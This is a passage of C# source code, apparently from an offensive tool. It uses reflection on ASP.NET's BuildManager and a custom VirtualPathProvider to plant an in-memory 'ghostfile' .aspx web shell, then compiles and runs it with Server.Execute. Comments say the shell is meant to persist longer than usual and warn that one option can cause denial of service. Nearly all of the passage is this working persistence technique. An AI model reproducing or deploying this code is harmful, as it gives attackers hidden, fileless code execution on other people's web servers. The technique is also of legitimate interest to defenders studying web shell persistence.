                field_isPrecompiledAppComputed = typeBuildManager.GetField("_isPrecompiledAppComputed", System.Reflection.BindingFlags.Instance | System.Reflection.BindingFlags.NonPublic);
                field_isPrecompiledApp = typeBuildManager.GetField("_isPrecompiledApp", System.Reflection.BindingFlags.Instance | System.Reflection.BindingFlags.NonPublic);
                field_theBuildManager_instance = field_theBuildManager.GetValue(null);
                field_isPrecompiledAppComputed_oldValue = field_isPrecompiledAppComputed.GetValue(field_theBuildManager_instance);
                field_isPrecompiledApp_oldValue = field_isPrecompiledApp.GetValue(field_theBuildManager_instance);
                field_isPrecompiledAppComputed.SetValue(field_theBuildManager_instance, true);
                field_isPrecompiledApp.SetValue(field_theBuildManager_instance, false);
            }

            // IsPrecompiledApp is false!
            System.Web.Hosting.HostingEnvironment.RegisterVirtualPathProvider(sampleProvider);

            if (field_isPrecompiledAppComputed != null)
            {
                // To reverse isPrecompiledApp settings
                field_isPrecompiledAppComputed.SetValue(field_theBuildManager_instance, field_isPrecompiledAppComputed_oldValue);
                field_isPrecompiledApp.SetValue(field_theBuildManager_instance, field_isPrecompiledApp_oldValue);
            }

            System.Web.HttpContext.Current.Response.Clear();
            System.Web.HttpContext.Current.Response.BufferOutput = true;

            //*
            System.Web.HttpContext.Current.Server.Execute(targetVirtualPath + "ghostfile" + (new System.Random()).Next(1000) + webshellType); // if you need to compile a file immediately
            System.Web.HttpContext.Current.Response.End();

            //*/
            //OR
            /*
            string redirectionTarget = (System.Web.HttpContext.Current.Request.ApplicationPath + targetVirtualPath + "ghostfile" + (new System.Random()).Next(1000) + webshellType).Replace("//", "/");
            System.Web.HttpContext.Current.Response.Redirect(redirectionTarget);
            //*/
        }
        catch (System.Exception error)
        {
            System.Web.HttpContext.Current.Response.AddHeader("Errors", System.Web.HttpUtility.UrlEncode(error.ToString()));
        }
    }

    public class myHandler : System.Web.IHttpHandler, System.Web.Routing.IRouteHandler
    {
        public bool IsReusable
        {
            get { return true; }
        }

        public void ProcessRequest(System.Web.HttpContext context)
        {
            // your processing here
        }

        public System.Web.IHttpHandler GetHttpHandler(System.Web.Routing.RequestContext requestContext)
        {
            return this;
        }
    }
    // Reference: https://docs.microsoft.com/en-us/dotnet/api/system.web.hosting.virtualpathprovider?view=netframework-4.8
    public class SamplePathProvider : System.Web.Hosting.VirtualPathProvider
    {
        private string _virtualDir;
        private string _fileContent;

        public SamplePathProvider(string virtualDir, string fileContent)
          : base()
        {

            _virtualDir = "/" + virtualDir.Replace(@"\", "/");
            _virtualDir = _virtualDir.Replace("//", "/").TrimEnd('/');

            _fileContent = fileContent;
        }

        protected override void Initialize()
        { }

        private bool IsPathVirtual(string virtualPath)
        {
            //return true; // uncomment this if you need to take over all non-compiled files! this can be very disruptive and can cause DoS
            System.String checkPath = System.Web.VirtualPathUtility.ToAppRelative(virtualPath);
            return checkPath.ToLower().Contains(_virtualDir.ToLower()); // checkPath.ToLower().Contains(_virtualDir.ToLower()) && checkPath.ToLower().EndsWith(".aspx");
        }

        public override bool FileExists(string virtualPath)
        {
            if (IsPathVirtual(virtualPath))
            {
                return true;
            }
            else
            {
                return Previous.FileExists(virtualPath);
            }
        }

        public override bool DirectoryExists(string virtualDir)
        {
            if (IsPathVirtual(virtualDir))
            {
                return true;
            }
            else
            {
                return Previous.DirectoryExists(virtualDir);
            }
        }

        public override System.Web.Hosting.VirtualFile GetFile(string virtualPath)
        {
            if (IsPathVirtual(virtualPath))
                return new SampleVirtualFile(virtualPath, _fileContent);
            else
                return Previous.GetFile(virtualPath);
        }


        public override System.Web.Hosting.VirtualDirectory GetDirectory(string virtualDir)
        {
            if (IsPathVirtual(virtualDir))
                return new SampleVirtualDirectory(virtualDir);
            else
                return Previous.GetDirectory(virtualDir);
        }

        public override System.Web.Caching.CacheDependency GetCacheDependency(
          string virtualPath,
          System.Collections.IEnumerable virtualPathDependencies,
          System.DateTime utcStart)
        {
            if (IsPathVirtual(virtualPath))
            {
                /*
                System.Collections.Specialized.StringCollection fullPathDependencies = null;

                // Get the full path to all dependencies.
                foreach (string virtualDependency in virtualPathDependencies)
                {
                    if (fullPathDependencies == null)
                        fullPathDependencies = new System.Collections.Specialized.StringCollection();

                    fullPathDependencies.Add(virtualDependency);
                }
                if (fullPathDependencies == null)
                    return null;

                // Copy the list of full-path dependencies into an array.
                string[] fullPathDependenciesArray = new string[fullPathDependencies.Count];
                fullPathDependencies.CopyTo(fullPathDependenciesArray, 0);
                
                // Copy the virtual path into an array.
                string[] virtualPathArray = new string[1];
                virtualPathArray[0] = @"c:\";

                return new System.Web.Caching.CacheDependency(virtualPathArray, fullPathDependenciesArray, utcStart);
                */

                // we want our web shell to remain  longer than usual! (NO. 2) - uncomment above if you want a shorter expiry
                return new System.Web.Caching.CacheDependency(@"c:\");
            }
            else
            {
                return Previous.GetCacheDependency(virtualPath, virtualPathDependencies, utcStart);
            }
        }
    }

    public class SampleVirtualFile : System.Web.Hosting.VirtualFile
    {
        private string _fileContent;
        public bool Exists
        {
            get { return true; }
        }

        public SampleVirtualFile(string virtualPath, string fileContent)
          : base(virtualPath)
        {
            this._fileContent = fileContent;
        }

        public override System.IO.Stream Open()
        {
            System.IO.Stream stream = new System.IO.MemoryStream(System.Text.Encoding.UTF8.GetBytes(_fileContent));
            return stream;
        }
    }

    public class SampleVirtualDirectory : System.Web.Hosting.VirtualDirectory
    {
        public SampleVirtualDirectory(string virtualDir)
          : base(virtualDir)
        {
            string path = virtualDir;

            // System.Web.Hosting.HostingEnvironment.ApplicationVirtualPath or System.Web.HttpContext.Current.Request.ApplicationPath ? */
            if (System.Web.HttpContext.Current.Request.ApplicationPath != "/")
            {
                int index = virtualDir.IndexOf(System.Web.HttpContext.Current.Request.ApplicationPath.ToLower());
                if (index >= 0)
                    path = virtualDir.Remove(index, System.Web.HttpContext.Current.Request.ApplicationPath.Length);
            }

            path = path.TrimEnd('/');

            if (!string.IsNullOrEmpty(path))
            {

                //SampleVirtualDirectory svd = new SampleVirtualDirectory(path);
                children.Add(this);
                directories.Add(this);

                SampleVirtualFile svf = new SampleVirtualFile(path + "/ghostfile.aspx", "");
                children.Add(svf);
                files.Add(svf);
            }
        }

        private System.Collections.ArrayList children = new System.Collections.ArrayList();
        public override System.Collections.IEnumerable Children
        {
            get { return children; }
        }

        private System.Collections.ArrayList directories = new System.Collections.ArrayList();
        public override System.Collections.IEnumerable Directories
        {
            get { return directories; }
        }

        private System.Collections.ArrayList files = new System.Collections.ArrayList();
        public override System.Collections.IEnumerable Files
        {
            get { return files; }
        }
    }
}